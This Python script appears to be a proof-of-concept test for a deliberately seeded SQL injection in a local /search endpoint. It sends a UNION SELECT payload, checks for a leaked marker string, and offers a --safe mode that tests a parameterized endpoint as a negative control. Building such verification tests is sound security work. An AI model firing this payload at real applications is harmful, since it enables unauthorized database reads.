#!/usr/bin/env python3
"""PoC for the seeded /search SQL injection (and its negative control with --safe).

Exit 0 + "SQLI_CONFIRMED" only when the UNION row leaks out of the database.
"""

import argparse
import sys
import urllib.parse
import urllib.request

PAYLOAD = "' UNION SELECT 999,'LEAKED_SECRET_9f3'-- "
MARKER = "LEAKED_SECRET_9f3"


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default="http://127.0.0.1:8000")
    parser.add_argument("--safe", action="store_true", help="hit the parameterized endpoint")
    args = parser.parse_args()
    path = "/search-safe" if args.safe else "/search"
    url = f"{args.base}{path}?q=" + urllib.parse.quote(PAYLOAD)
    try:
        with urllib.request.urlopen(url, timeout=5) as resp:
            body = resp.read().decode("utf-8", "replace")
    except Exception as exc:  # noqa: BLE001 - any failure is "no leak"
        print(f"request failed: {exc}")
        return 2
    if MARKER in body:
        print("SQLI_CONFIRMED")
        print(body)
        return 0
    print("NO_LEAK")
    return 1


if __name__ == "__main__":
    sys.exit(main())
